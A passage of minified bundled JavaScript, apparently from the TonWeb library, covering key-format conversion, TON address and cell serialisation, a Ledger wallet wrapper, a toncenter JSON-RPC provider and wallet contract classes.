            for (var e = new Uint8Array(t.length), r = 0; r < t.length; r++)
              e[r] = t.charCodeAt(r);
            return e;
          }
          function p(t) {
            return (
              t instanceof ArrayBuffer && (t = new Uint8Array(t)),
              String.fromCharCode.apply(String, t)
            );
          }
          function w(t) {
            var e = {
              name: (t.name || t || "").toUpperCase().replace("V", "v"),
            };
            switch (e.name) {
              case "SHA-1":
              case "SHA-256":
              case "SHA-384":
              case "SHA-512":
                break;
              case "AES-CBC":
              case "AES-GCM":
              case "AES-KW":
                t.length && (e["length"] = t.length);
                break;
              case "HMAC":
                (t.hash && (e["hash"] = w(t.hash)),
                  t.length && (e["length"] = t.length));
                break;
              case "RSAES-PKCS1-v1_5":
                (t.publicExponent &&
                  (e["publicExponent"] = new Uint8Array(t.publicExponent)),
                  t.modulusLength && (e["modulusLength"] = t.modulusLength));
                break;
              case "RSASSA-PKCS1-v1_5":
              case "RSA-OAEP":
                (t.hash && (e["hash"] = w(t.hash)),
                  t.publicExponent &&
                    (e["publicExponent"] = new Uint8Array(t.publicExponent)),
                  t.modulusLength && (e["modulusLength"] = t.modulusLength));
                break;
              default:
                throw new SyntaxError("Bad algorithm name");
            }
            return e;
          }
          function C(t) {
            return {
              HMAC: {
                "SHA-1": "HS1",
                "SHA-256": "HS256",
                "SHA-384": "HS384",
                "SHA-512": "HS512",
              },
              "RSASSA-PKCS1-v1_5": {
                "SHA-1": "RS1",
                "SHA-256": "RS256",
                "SHA-384": "RS384",
                "SHA-512": "RS512",
              },
              "RSAES-PKCS1-v1_5": { "": "RSA1_5" },
              "RSA-OAEP": { "SHA-1": "RSA-OAEP", "SHA-256": "RSA-OAEP-256" },
              "AES-KW": { 128: "A128KW", 192: "A192KW", 256: "A256KW" },
              "AES-GCM": { 128: "A128GCM", 192: "A192GCM", 256: "A256GCM" },
              "AES-CBC": { 128: "A128CBC", 192: "A192CBC", 256: "A256CBC" },
            }[t.name][(t.hash || {}).name || t.length || ""];
          }
          function g(t) {
            (t instanceof ArrayBuffer || t instanceof Uint8Array) &&
              (t = JSON.parse(decodeURIComponent(escape(p(t)))));
            var e = { kty: t.kty, alg: t.alg, ext: t.ext || t.extractable };
            switch (e.kty) {
              case "oct":
                e.k = t.k;
              case "RSA":
                ["n", "e", "d", "p", "q", "dp", "dq", "qi", "oth"].forEach(
                  function (r) {
                    r in t && (e[r] = t[r]);
                  },
                );
                break;
              default:
                throw new TypeError("Unsupported key type");
            }
            return e;
          }
          function y(t) {
            var e = g(t);
            return (
              o && ((e["extractable"] = e.ext), delete e.ext),
              f(unescape(encodeURIComponent(JSON.stringify(e)))).buffer
            );
          }
          function m(t) {
            var e = A(t),
              r = !1;
            e.length > 2 && ((r = !0), e.shift());
            var n = { ext: !0 };
            switch (e[0][0]) {
              case "1.2.840.113549.1.1.1":
                var i = ["n", "e", "d", "p", "q", "dp", "dq", "qi"],
                  s = A(e[1]);
                r && s.shift();
                for (var o = 0; o < s.length; o++)
                  (s[o][0] || (s[o] = s[o].subarray(1)),
                    (n[i[o]] = u(p(s[o]))));
                n["kty"] = "RSA";
                break;
              default:
                throw new TypeError("Unsupported key type");
            }
            return n;
          }
          function B(t) {
            var e,
              r = [["", null]],
              n = !1;
            switch (t.kty) {
              case "RSA":
                for (
                  var i = ["n", "e", "d", "p", "q", "dp", "dq", "qi"],
                    s = [],
                    o = 0;
                  o < i.length;
                  o++
                ) {
                  if (!(i[o] in t)) break;
                  var a = (s[o] = f(d(t[i[o]])));
                  128 & a[0] &&
                    ((s[o] = new Uint8Array(a.length + 1)), s[o].set(a, 1));
                }
                (s.length > 2 && ((n = !0), s.unshift(new Uint8Array([0]))),
                  (r[0][0] = "1.2.840.113549.1.1.1"),
                  (e = s));
                break;
              default:
                throw new TypeError("Unsupported key type");
            }
            return (
              r.push(new Uint8Array(F(e)).buffer),
              n
                ? r.unshift(new Uint8Array([0]))
                : (r[1] = { tag: 3, value: r[1] }),
              new Uint8Array(F(r)).buffer
            );
          }
          function A(t, e) {
            if (
              (t instanceof ArrayBuffer && (t = new Uint8Array(t)),
              e || (e = { pos: 0, end: t.length }),
              e.end - e.pos < 2 || e.end > t.length)
            )
              throw new RangeError("Malformed DER");
            var r,
              n = t[e.pos++],
              i = t[e.pos++];
            if (i >= 128) {
              if (((i &= 127), e.end - e.pos < i))
                throw new RangeError("Malformed DER");
              for (var s = 0; i--; ) ((s <<= 8), (s |= t[e.pos++]));
              i = s;
            }
            if (e.end - e.pos < i) throw new RangeError("Malformed DER");
            switch (n) {
              case 2:
                r = t.subarray(e.pos, (e.pos += i));
                break;
              case 3:
                if (t[e.pos++]) throw new Error("Unsupported bit string");
                i--;
              case 4:
                r = new Uint8Array(t.subarray(e.pos, (e.pos += i))).buffer;
                break;
              case 5:
                r = null;
                break;
              case 6:
                var o = btoa(p(t.subarray(e.pos, (e.pos += i))));
                if (!(o in l)) throw new Error("Unsupported OBJECT ID " + o);
                r = l[o];
                break;
              case 48:
                r = [];
                for (var a = e.pos + i; e.pos < a; ) r.push(A(t, e));
                break;
              default:
                throw new Error("Unsupported DER tag 0x" + n.toString(16));
            }
            return r;
          }
          function F(t, e) {
            e || (e = []);
            var r = 0,
              n = 0,
              i = e.length + 2;
            if ((e.push(0, 0), t instanceof Uint8Array)) {
              ((r = 2), (n = t.length));
              for (var s = 0; s < n; s++) e.push(t[s]);
            } else if (t instanceof ArrayBuffer) {
              ((r = 4), (n = t.byteLength), (t = new Uint8Array(t)));
              for (s = 0; s < n; s++) e.push(t[s]);
            } else if (null === t) ((r = 5), (n = 0));
            else if ("string" === typeof t && t in h) {
              var o = f(atob(h[t]));
              ((r = 6), (n = o.length));
              for (s = 0; s < n; s++) e.push(o[s]);
            } else if (t instanceof Array) {
              for (s = 0; s < t.length; s++) F(t[s], e);
              ((r = 48), (n = e.length - i));
            } else {
              if (
                !(
                  "object" === typeof t &&
                  3 === t.tag &&
                  t.value instanceof ArrayBuffer
                )
              )
                throw new Error("Unsupported DER value " + t);
              ((t = new Uint8Array(t.value)),
                (r = 3),
                (n = t.byteLength),
                e.push(0));
              for (s = 0; s < n; s++) e.push(t[s]);
              n++;
            }
            if (n >= 128) {
              var a = n;
              n = 4;
              e.splice(
                i,
                0,
                (a >> 24) & 255,
                (a >> 16) & 255,
                (a >> 8) & 255,
                255 & a,
              );
              while (n > 1 && !(a >> 24)) ((a <<= 8), n--);
              (n < 4 && e.splice(i, 4 - n), (n |= 128));
            }
            return (e.splice(i - 2, 2, r, n), e);
          }
          function E(t, e, r, n) {
            Object.defineProperties(this, {
              _key: { value: t },
              type: { value: t.type, enumerable: !0 },
              extractable: {
                value: void 0 === r ? t.extractable : r,
                enumerable: !0,
              },
              algorithm: {
                value: void 0 === e ? t.algorithm : e,
                enumerable: !0,
              },
              usages: { value: void 0 === n ? t.usages : n, enumerable: !0 },
            });
          }
          function b(t) {
            return "verify" === t || "encrypt" === t || "wrapKey" === t;
          }
          function v(t) {
            return "sign" === t || "decrypt" === t || "unwrapKey" === t;
          }
        }));
      e.default = {};
    },
    8149: function (t, e, r) {
      const {
          crc16: n,
          hexToBytes: i,
          bytesToHex: s,
          stringToBytes: o,
          base64toString: a,
          stringToBase64: l,
        } = r(4697),
        h = 17,
        c = 81,
        u = 128;
      function d(t) {
        if (48 !== t.length)
          throw new Error(
            "User-friendly address should contain strictly 48 characters",
          );
        const e = o(a(t));
        if (36 !== e.length)
          throw "Unknown address type: byte length is not equal to 36";
        const r = e.slice(0, 34),
          i = e.slice(34, 36),
          s = n(r);
        if (s[0] !== i[0] || s[1] !== i[1]) throw "Wrong crc16 hashsum";
        let l = r[0],
          d = !1,
          f = !1;
        if ((l & u && ((d = !0), (l ^= u)), l !== h && l !== c))
          throw "Unknown address tag";
        f = l === h;
        let p = null;
        if (((p = 255 === r[1] ? -1 : r[1]), 0 !== p && -1 !== p))
          throw new Error("Invalid address wc " + p);
        const w = r.slice(2, 34);
        return { isTestOnly: d, isBounceable: f, workchain: p, hashPart: w };
      }
      class Address {
        static isValid(t) {
          try {
            return (new Address(t), !0);
          } catch (e) {
            return !1;
          }
        }
        constructor(t) {
          if (null == t) throw "Invalid address";
          if (t instanceof Address)
            return (
              (this.wc = t.wc),
              (this.hashPart = t.hashPart),
              (this.isTestOnly = t.isTestOnly),
              (this.isUserFriendly = t.isUserFriendly),
              (this.isBounceable = t.isBounceable),
              void (this.isUrlSafe = t.isUrlSafe)
            );
          if (
            (t.search(/\-/) > 0 || t.search(/_/) > 0
              ? ((this.isUrlSafe = !0),
                (t = t.replace(/\-/g, "+").replace(/_/g, "/")))
              : (this.isUrlSafe = !1),
            t.indexOf(":") > -1)
          ) {
            const e = t.split(":");
            if (2 !== e.length) throw new Error("Invalid address " + t);
            const r = parseInt(e[0]);
            if (0 !== r && -1 !== r) throw new Error("Invalid address wc " + t);
            const n = e[1];
            if (64 !== n.length) throw new Error("Invalid address hex " + t);
            ((this.isUserFriendly = !1),
              (this.wc = r),
              (this.hashPart = i(n)),
              (this.isTestOnly = !1),
              (this.isBounceable = !1));
          } else {
            this.isUserFriendly = !0;
            const e = d(t);
            ((this.wc = e.workchain),
              (this.hashPart = e.hashPart),
              (this.isTestOnly = e.isTestOnly),
              (this.isBounceable = e.isBounceable));
          }
        }
        toString(t, e, r, i) {
          if (
            (void 0 === t && (t = this.isUserFriendly),
            void 0 === e && (e = this.isUrlSafe),
            void 0 === r && (r = this.isBounceable),
            void 0 === i && (i = this.isTestOnly),
            t)
          ) {
            let t = r ? h : c;
            i && (t |= u);
            const s = new Int8Array(34);
            ((s[0] = t), (s[1] = this.wc), s.set(this.hashPart, 2));
            const o = new Uint8Array(36);
            (o.set(s), o.set(n(s), 34));
            let a = l(String.fromCharCode.apply(null, new Uint8Array(o)));
            return (e && (a = a.replace(/\+/g, "-").replace(/\//g, "_")), a);
          }
          return this.wc + ":" + s(this.hashPart);
        }
      }
      t.exports.default = Address;
    },
    8150: function (t, e, r) {
      const { hexToBytes: n, bytesToHex: i } = r(4697);
      class AdnlAddress {
        static isValid(t) {
          try {
            return (new AdnlAddress(t), !0);
          } catch (e) {
            return !1;
          }
        }
        constructor(t) {
          if (null == t) throw "Invalid address";
          if (t instanceof AdnlAddress) this.bytes = t.bytes;
          else if (t instanceof Uint8Array) {
            if (32 !== t.length) throw new Error("invalid adnl bytes length");
            this.bytes = t;
          } else {
            if ("string" !== typeof t) throw new Error("unsupported type");
            if (64 !== t.length) throw new Error("invalid adnl hex length");
            this.bytes = n(t);
          }
        }
        toHex() {
          let t = i(this.bytes);
          while (t.length < 64) t = "0" + t;
          return t;
        }
      }
      t.exports.default = AdnlAddress;
    },
    8151: function (t, e, r) {
      const { hexToBytes: n, bytesToHex: i } = r(4697);
      class StorageBagId {
        static isValid(t) {
          try {
            return (new StorageBagId(t), !0);
          } catch (e) {
            return !1;
          }
        }
        constructor(t) {
          if (null == t) throw "Invalid address";
          if (t instanceof StorageBagId) this.bytes = t.bytes;
          else if (t instanceof Uint8Array) {
            if (32 !== t.length) throw new Error("invalid bag id bytes length");
            this.bytes = t;
          } else {
            if ("string" !== typeof t) throw new Error("unsupported type");
            if (64 !== t.length) throw new Error("invalid bag id hex length");
            this.bytes = n(t);
          }
        }
        toHex() {
          let t = i(this.bytes);
          while (t.length < 64) t = "0" + t;
          return t;
        }
      }
      t.exports.default = StorageBagId;
    },
    8152: function (t, e, r) {
      const { BitString: n } = r(5250),
        {
          bytesToBase64: i,
          compareBytes: s,
          concatBytes: o,
          crc32c: a,
          hexToBytes: l,
          readNBytesUIntFromArray: h,
          sha256: c,
          bytesToHex: u,
        } = r(2916),
        { Slice: d } = r(6200),
        f = l("B5EE9C72"),
        p = l("68ff65f3"),
        w = l("acc3a728");
      class Cell {
        constructor() {
          ((this.bits = new n(1023)), (this.refs = []), (this.isExotic = !1));
        }
        static fromBoc(t) {
          return B(t);
        }
        static oneFromBoc(t) {
          const e = B(t);
          if (1 !== e.length)
            throw new Error("expected 1 root cell but have " + e.length);
          return e[0];
        }
        writeCell(t) {
          (this.bits.writeBitString(t.bits),
            (this.refs = this.refs.concat(t.refs)));
        }
        getMaxLevel() {
          let t = 0;
          for (let e in this.refs) {
            const r = this.refs[e];
            r.getMaxLevel() > t && (t = r.getMaxLevel());
          }
          return t;
        }
        isExplicitlyStoredHashes() {
          return 0;
        }
        getMaxDepth() {
          let t = 0;
          if (this.refs.length > 0) {
            for (let e in this.refs) {
              const r = this.refs[e];
              r.getMaxDepth() > t && (t = r.getMaxDepth());
            }
            t += 1;
          }
          return t;
        }
        getMaxDepthAsArray() {
          const t = this.getMaxDepth(),
            e = Uint8Array.from({ length: 2 }, () => 0);
          return ((e[1] = t % 256), (e[0] = Math.floor(t / 256)), e);
        }
        getRefsDescriptor() {
          const t = Uint8Array.from({ length: 1 }, () => 0);
          return (
            (t[0] =
              this.refs.length + 8 * this.isExotic + 32 * this.getMaxLevel()),
            t
          );
        }
        getBitsDescriptor() {
          const t = Uint8Array.from({ length: 1 }, () => 0);
          return (
            (t[0] =
              Math.ceil(this.bits.cursor / 8) +
              Math.floor(this.bits.cursor / 8)),
            t
          );
        }
        getDataWithDescriptors() {
          const t = this.getRefsDescriptor(),
            e = this.getBitsDescriptor(),
            r = this.bits.getTopUppedArray();
          return o(o(t, e), r);
        }
        async getRepr() {
          const t = [];
          t.push(this.getDataWithDescriptors());
          for (let r in this.refs) {
            const e = this.refs[r];
            t.push(e.getMaxDepthAsArray());
          }
          for (let r in this.refs) {
            const e = this.refs[r];
            t.push(await e.hash());
          }
          let e = new Uint8Array();
          for (let r in t) {
            const n = t[r];
            e = o(e, n);
          }
          return e;
        }
        async hash() {
          return new Uint8Array(await c(await this.getRepr()));
        }
        beginParse() {
          const t = this.refs.map((t) => t.beginParse());
          return new d(this.bits.array.slice(), this.bits.length, t);
        }
        print(t) {
          t = t || "";
          let e = t + "x{" + this.bits.toHex() + "}\n";
          for (let r in this.refs) {
            const n = this.refs[r];
            e += n.print(t + " ");
          }
          return e;
        }
        async toBoc(t, e, r, i) {
          (void 0 === t && (t = !0),
            void 0 === e && (e = !0),
            void 0 === r && (r = !1),
            void 0 === i && (i = 0));
          const s = this,
            l = await s.treeWalk(),
            h = l[0],
            c = l[1],
            u = h.length,
            d = u.toString(2).length,
            p = Math.min(Math.ceil(d / 8), 1);
          let w = 0,
            C = [];
          for (let n of h)
            (C.push(w), (w += await n[1].bocSerializationSize(c, p)));
          const g = w.toString(2).length,
            y = Math.max(Math.ceil(g / 8), 1),
            m = new n(1247 * h.length);
          (m.writeBytes(f),
            m.writeBitArray([t, e, r]),
            m.writeUint(i, 2),
            m.writeUint(p, 3),
            m.writeUint8(y),
            m.writeUint(u, 8 * p),
            m.writeUint(1, 8 * p),
            m.writeUint(0, 8 * p),
            m.writeUint(w, 8 * y),
            m.writeUint(0, 8 * p),
            t && h.forEach((t, e) => m.writeUint(C[e], 8 * y)));
          for (let n of h) {
            const t = await n[1].serializeForBoc(c, p);
            m.writeBytes(t);
          }
          let B = m.getTopUppedArray();
          return (e && (B = o(B, a(B))), B);
        }
        async serializeForBoc(t, e) {
          const r = [];
          if (
            (r.push(this.getDataWithDescriptors()),
            this.isExplicitlyStoredHashes())
          )
            throw new Error("Cell hashes explicit storing is not implemented");
          for (let i in this.refs) {
            const e = this.refs[i],
              n = await e.hash(),
              s = t[n];
            let o = s.toString(16);
            o.length % 2 && (o = "0" + o);
            const a = l(o);
            r.push(a);
          }
          let n = new Uint8Array();
          for (let i in r) {
            const t = r[i];
            n = o(n, t);
          }
          return n;
        }
        async bocSerializationSize(t, e) {
          return (await this.serializeForBoc(t, e)).length;
        }
        async treeWalk() {
          return g(this, [], {});
        }
      }
      async function C(t, e, r) {
        const n = t[r];
        for (let s in t) t[s] > n && (t[s] = t[s] - 1);
        t[r] = e.length - 1;
        const i = e.splice(n, 1)[0];
        e.push(i);
        for (let s of i[1].refs) await C(t, e, await s.hash());
      }
      async function g(t, e, r, n) {
        void 0 === n && (n = null);
        const i = await t.hash();
        if (i in r) return (n && r[n] > r[i] && (await C(r, e, i)), [e, r]);
        ((r[i] = e.length), e.push([i, t]));
        for (let s of t.refs) {
          const t = await g(s, e, r, i);
          ((e = t[0]), (r = t[1]));
        }
        return [e, r];
      }
      function y(t) {
        if (t.length < 5) throw "Not enough bytes for magic prefix";
        const e = t,
          r = t.slice(0, 4);
        let n, i, o, l, c;
        if (((t = t.slice(4)), s(r, f))) {
          const e = t[0];
          ((n = 128 & e),
            (i = 64 & e),
            (o = 32 & e),
            (l = 2 * (16 & e) + (8 & e)),
            (c = e % 8));
        }
        if (
          (s(r, p) && ((n = 1), (i = 0), (o = 0), (l = 0), (c = t[0])),
          s(r, w) && ((n = 1), (i = 1), (o = 0), (l = 0), (c = t[0])),
          (t = t.slice(1)),
          t.length < 1 + 5 * c)
        )
          throw "Not enough bytes for encoding cells counters";
        const u = t[0];
        t = t.slice(1);
        const d = h(c, t);
        t = t.slice(c);
        const C = h(c, t);
        t = t.slice(c);
        const g = h(c, t);
        t = t.slice(c);
        const y = h(u, t);
        if (((t = t.slice(u)), t.length < C * c))
          throw "Not enough bytes for encoding root cells hashes";
        let m = [];
        for (let s = 0; s < C; s++) (m.push(h(c, t)), (t = t.slice(c)));
        let B = !1;
        if (n) {
          if (((B = []), t.length < u * d))
            throw "Not enough bytes for index encoding";
          for (let e = 0; e < d; e++) (B.push(h(u, t)), (t = t.slice(u)));
        }
        if (t.length < y) throw "Not enough bytes for cells data";
        const A = t.slice(0, y);
        if (((t = t.slice(y)), i)) {
          if (t.length < 4) throw "Not enough bytes for crc32c hashsum";
          const r = e.length;
          if (!s(a(e.slice(0, r - 4)), t.slice(0, 4)))
            throw "Crc32c hashsum mismatch";
          t = t.slice(4);
        }
        if (t.length) throw "Too much bytes in BoC serialization";
        return {
          has_idx: n,
          hash_crc32: i,
          has_cache_bits: o,
          flags: l,
          size_bytes: c,
          off_bytes: u,
          cells_num: d,
          roots_num: C,
          absent_num: g,
          tot_cells_size: y,
          root_list: m,
          index: B,
          cells_data: A,
        };
      }
      function m(t, e) {
        if (t.length < 2) throw "Not enough bytes to encode cell descriptors";
        const r = t[0],
          n = t[1];
        t = t.slice(2);
        Math.floor(r / 32);
        const i = 8 & r,
          s = r % 8,
          o = Math.ceil(n / 2),
          a = !(n % 2);
        let l = new Cell();
        if (((l.isExotic = i), t.length < o + e * s))
          throw "Not enough bytes to encode cell data";
        (l.bits.setTopUppedArray(t.slice(0, o), a), (t = t.slice(o)));
        for (let c = 0; c < s; c++) (l.refs.push(h(e, t)), (t = t.slice(e)));
        return { cell: l, residue: t };
      }
      function B(t) {
        "string" == typeof t && (t = l(t));
        const e = y(t);
        let r = e.cells_data,
          n = [];
        for (let s = 0; s < e.cells_num; s++) {
          let t = m(r, e.size_bytes);
          ((r = t.residue), n.push(t.cell));
        }
        for (let s = e.cells_num - 1; s >= 0; s--) {
          let t = n[s];
          for (let e = 0; e < t.refs.length; e++) {
            const r = t.refs[e];
            if (r < s) throw "Topological order is broken";
            t.refs[e] = n[r];
          }
        }
        let i = [];
        for (let s of e.root_list) i.push(n[s]);
        return i;
      }
      t.exports = { Cell: Cell };
    },
    8153: function (t, e, r) {
      (function (e) {
        const { Cell: n } = r(2917),
          { Address: i, BN: s, bytesToHex: o } = r(2916),
          { Contract: a } = r(3061);
        class AppTon {
          constructor(t, e) {
            ((this.transport = t),
              (this.ton = e),
              (this.ADDRESS_FORMAT_HEX = 0),
              (this.ADDRESS_FORMAT_USER_FRIENDLY = 1),
              (this.ADDRESS_FORMAT_URL_SAFE = 2),
              (this.ADDRESS_FORMAT_BOUNCEABLE = 4),
              (this.ADDRESS_FORMAT_TEST_ONLY = 8));
          }
          async getAppConfiguration() {
            const t = await this.transport.send(224, 1, 0, 0);
            return { version: t[0] + "." + t[1] + "." + t[2] };
          }
          async getPublicKey(t, r) {
            const n = e.alloc(4);
            n.writeInt32BE(t);
            const i = await this.transport.send(224, 2, r ? 1 : 0, 0, n),
              s = i[0],
              o = new Uint8Array(i.slice(1, 1 + s));
            return { publicKey: o };
          }
          async getAddress(t, r, n) {
            const s = e.alloc(4);
            s.writeInt32BE(t);
            const a = await this.transport.send(224, 5, r ? 1 : 0, n, s),
              l = a[0],
              h = new Uint8Array(a.slice(1, 1 + l)),
              c = new i("0:" + o(h));
            return { address: c };
          }
          async sign(t, r) {
            const n = e.alloc(4);
            n.writeInt32BE(t);
            const i = e.concat([n, e.from(r)]),
              s = await this.transport.send(224, 3, 0, 0, i),
              o = s[0],
              a = s.slice(1, 1 + o);
            return { signature: a };
          }
          async transfer(t, r, i, s, o, l) {
            const h = 3,
              c = await r.createTransferMessage(null, i, s, o, null, h, !0),
              u = e.alloc(4);
            u.writeInt32BE(t);
            const d = e.concat([u, e.from(await c.signingMessage.toBoc())]),
              f = await this.transport.send(224, 4, l, 0, d),
              p = f[0],
              w = f.slice(1, 1 + p),
              C = new Uint8Array(w),
              g = new n();
            (g.bits.writeBytes(C), g.writeCell(c.signingMessage));
            let y = null,
              m = null,
              B = null;
            if (0 === o) {
              const t = await r.createStateInit();
              ((y = t.stateInit), (m = t.code), (B = t.data));
            }
            const A = await r.getAddress(),
              F = a.createExternalMessageHeader(A),
              E = a.createCommonMsgInfo(F, y, g),
              b = new Promise((t) => {
                t({
                  address: A,
                  message: E,
                  body: g,
                  signature: C,
                  signingMessage: c.signingMessage,
                  stateInit: y,
                  code: m,
                  data: B,
                });
              });
            return a.createMethod(this.ton.provider, b);
          }
        }
        t.exports = AppTon;
      }).call(this, r(2).Buffer);
    },
    8154: function (t, e, r) {
      const { Cell: n } = r(2917),
        { base64ToBytes: i } = r(2916),
        s = r(8155).default;
      "undefined" === typeof fetch && (fetch = r(8156));
      const o = "-9223372036854775808";
      class HttpProvider {
        constructor(t, e) {
          ((this.host = t || "https://toncenter.com/api/v2/jsonRPC"),
            (this.options = e || {}));
        }
        sendImpl(t, e) {
          const r = { "Content-Type": "application/json" };
          return (
            this.options.apiKey && (r["X-API-Key"] = this.options.apiKey),
            fetch(t, { method: "POST", headers: r, body: JSON.stringify(e) })
              .then((t) => t.json())
              .then((t) => {
                let { result: e, error: r } = t;
                return e || Promise.reject(r);
              })
          );
        }
        send(t, e) {
          return this.sendImpl(this.host, {
            id: 1,
            jsonrpc: "2.0",
            method: t,
            params: e,
          });
        }
        async getAddressInfo(t) {
          return this.send("getAddressInformation", { address: t });
        }
        async getExtendedAddressInfo(t) {
          return this.send("getExtendedAddressInformation", { address: t });
        }
        async getWalletInfo(t) {
          return this.send("getWalletInformation", { address: t });
        }
        async getTransactions(t, e, r, n, i, s) {
          return (
            void 0 === e && (e = 20),
            void 0 === r && (r = void 0),
            void 0 === n && (n = void 0),
            void 0 === i && (i = void 0),
            void 0 === s && (s = void 0),
            this.send("getTransactions", {
              address: t,
              limit: e,
              lt: r,
              hash: n,
              to_lt: i,
              archival: s,
            })
          );
        }
        async getBalance(t) {
          return this.send("getAddressBalance", { address: t });
        }
        async sendBoc(t) {
          return this.send("sendBoc", { boc: t });
        }
        async sendQuery(t) {
          return this.send("sendQuerySimple", t);
        }
        async getEstimateFee(t) {
          return this.send("estimateFee", t);
        }
        async call(t, e, r) {
          return (
            void 0 === r && (r = []),
            this.send("runGetMethod", { address: t, method: e, stack: r })
          );
        }
        async call2(t, e, r) {
          void 0 === r && (r = []);
          const n = await this.send("runGetMethod", {
            address: t,
            method: e,
            stack: r,
          });
          return s.parseResponse(n);
        }
        async getConfigParam(t) {
          const e = await this.send("getConfigParam", { config_id: t });
          if ("configInfo" !== e["@type"])
            throw new Error("getConfigParam expected type configInfo");
          if (!e.config) throw new Error("getConfigParam expected config");
          if ("tvm.cell" !== e.config["@type"])
            throw new Error("getConfigParam expected type tvm.cell");
          if (!e.config.bytes) throw new Error("getConfigParam expected bytes");
          return n.oneFromBoc(i(e.config.bytes));
        }
        async getMasterchainInfo() {
          return this.send("getMasterchainInfo", {});
        }
        async getBlockShards(t) {
          return this.send("shards", { seqno: t });
        }
        async getBlockTransactions(t, e, r) {
          return this.send("getBlockTransactions", {
            workchain: t,
            shard: e,
            seqno: r,
          });
        }
        async getMasterchainBlockTransactions(t) {
          return this.getBlockTransactions(-1, o, t);
        }
        async getBlockHeader(t, e, r) {
          return this.send("getBlockHeader", {
            workchain: t,
            shard: e,
            seqno: r,
          });
        }
        async getMasterchainBlockHeader(t) {
          return this.getBlockHeader(-1, o, t);
        }
      }
      ((HttpProvider.SHARD_ID_ALL = o), (t.exports.default = HttpProvider));
    },
    8155: function (t, e, r) {
      const { BN: n, base64ToBytes: i } = r(2916),
        { Cell: s } = r(2917);
      class HttpProviderUtils {
        static parseObject(t) {
          const e = t["@type"];
          switch (e) {
            case "tvm.list":
            case "tvm.tuple":
              return t.elements.map(HttpProviderUtils.parseObject);
            case "tvm.cell":
              return s.oneFromBoc(i(t.bytes));
            case "tvm.stackEntryCell":
              return HttpProviderUtils.parseObject(t.cell);
            case "tvm.stackEntryTuple":
              return HttpProviderUtils.parseObject(t.tuple);
            case "tvm.stackEntryNumber":
              return HttpProviderUtils.parseObject(t.number);
            case "tvm.numberDecimal":
              return new n(t.number, 10);
            default:
              throw new Error("unknown type " + e);
          }
        }
        static parseResponseStack(t) {
          const e = t[0],
            r = t[1];
          switch (e) {
            case "num":
              return new n(r.replace(/0x/, ""), 16);
            case "list":
            case "tuple":
              return HttpProviderUtils.parseObject(r);
            case "cell":
              const t = i(r.bytes);
              return s.oneFromBoc(t);
            default:
              throw new Error("unknown type " + e);
          }
        }
        static parseResponse(t) {
          if (0 !== t.exit_code) {
            const e = new Error("http provider parse response error");
            throw ((e.result = t), e);
          }
          const e = t.stack.map(HttpProviderUtils.parseResponseStack);
          return 1 === e.length ? e[0] : e;
        }
        static makeArg(t) {
          if (t instanceof n || t instanceof Number) return ["num", t];
          throw new Error("unknown arg type " + t);
        }
        static makeArgs(t) {
          return t.map(this.makeArg);
        }
      }
      t.exports.default = HttpProviderUtils;
    },
    8157: function (t, e, r) {
      const { Cell: n } = r(2917),
        {
          Address: i,
          BN: s,
          toNano: o,
          bytesToHex: a,
          hexToBytes: l,
          nacl: h,
          stringToBytes: c,
          bytesToBase64: u,
        } = r(2916),
        { Contract: d } = r(3061),
        {
          SimpleWalletContractR1: f,
          SimpleWalletContractR2: p,
          SimpleWalletContractR3: w,
        } = r(8158),
        { WalletV2ContractR1: C, WalletV2ContractR2: g } = r(8159),
        { WalletV3ContractR1: y, WalletV3ContractR2: m } = r(8160),
        { WalletV4ContractR1: B } = r(8161),
        { WalletV4ContractR2: A } = r(8162),
        F = {
          simpleR1: f,
          simpleR2: p,
          simpleR3: w,
          v2R1: C,
          v2R2: g,
          v3R1: y,
          v3R2: m,
          v4R1: B,
          v4R2: A,
        },
        E = [f, p, w, C, g, y, m, B, A];
      class Wallets {
        constructor(t) {
          ((this.provider = t),
            (this.all = F),
            (this.list = E),
            (this.defaultVersion = "v3R1"),
            (this.default = this.all[this.defaultVersion]));
        }
        create(t) {
          return new this.default(this.provider, t);
        }
      }
      ((Wallets.all = F), (Wallets.list = E), (t.exports.default = Wallets));
    },
    8158: function (t, e, r) {
      const { Cell: n } = r(2917),
        { WalletContract: i } = r(3904);
      class SimpleWalletContractR1 extends i {
        constructor(t, e) {
          ((e.code = n.oneFromBoc(
            "B5EE9C72410101010044000084FF0020DDA4F260810200D71820D70B1FED44D0D31FD3FFD15112BAF2A122F901541044F910F2A2F80001D31F3120D74A96D307D402FB00DED1A4C8CB1FCBFFC9ED5441FDF089",
          )),
            super(t, e));
        }
        getName() {
          return "simpleR1";
        }
      }
      class SimpleWalletContractR2 extends i {
        constructor(t, e) {
          ((e.code = n.oneFromBoc(
            "B5EE9C724101010100530000A2FF0020DD2082014C97BA9730ED44D0D70B1FE0A4F260810200D71820D70B1FED44D0D31FD3FFD15112BAF2A122F901541044F910F2A2F80001D31F3120D74A96D307D402FB00DED1A4C8CB1FCBFFC9ED54D0E2786F",
          )),
            super(t, e));
        }
        getName() {
          return "simpleR2";
        }
      }
      class SimpleWalletContractR3 extends i {
        constructor(t, e) {
          ((e.code = n.oneFromBoc(
            "B5EE9C7241010101005F0000BAFF0020DD2082014C97BA218201339CBAB19C71B0ED44D0D31FD70BFFE304E0A4F260810200D71820D70B1FED44D0D31FD3FFD15112BAF2A122F901541044F910F2A2F80001D31F3120D74A96D307D402FB00DED1A4C8CB1FCBFFC9ED54B5B86E42",
          )),
            super(t, e));
        }
        getName() {
          return "simpleR3";
        }
      }
      t.exports = {
        SimpleWalletContractR1: SimpleWalletContractR1,
        SimpleWalletContractR2: SimpleWalletContractR2,
        SimpleWalletContractR3: SimpleWalletContractR3,
      };
    },
    8159: function (t, e, r) {
      const { Cell: n } = r(2917),
        { WalletContract: i } = r(3904);
      class WalletV2ContractBase extends i {
        createSigningMessage(t, e) {
          ((t = t || 0), (e = e || Math.floor(Date.now() / 1e3) + 60));
          const r = new n();
          if ((r.bits.writeUint(t, 32), 0 === t))
            for (let n = 0; n < 32; n++) r.bits.writeBit(1);
          else r.bits.writeUint(e, 32);
          return r;
        }
      }
      class WalletV2ContractR1 extends WalletV2ContractBase {
        constructor(t, e) {
          ((e.code = n.oneFromBoc(
            "B5EE9C724101010100570000AAFF0020DD2082014C97BA9730ED44D0D70B1FE0A4F2608308D71820D31FD31F01F823BBF263ED44D0D31FD3FFD15131BAF2A103F901541042F910F2A2F800029320D74A96D307D402FB00E8D1A4C8CB1FCBFFC9ED54A1370BB6",
          )),
            super(t, e));
        }
        getName() {
          return "v2R1";
        }
      }
      class WalletV2ContractR2 extends WalletV2ContractBase {
        constructor(t, e) {
          ((e.code = n.oneFromBoc(
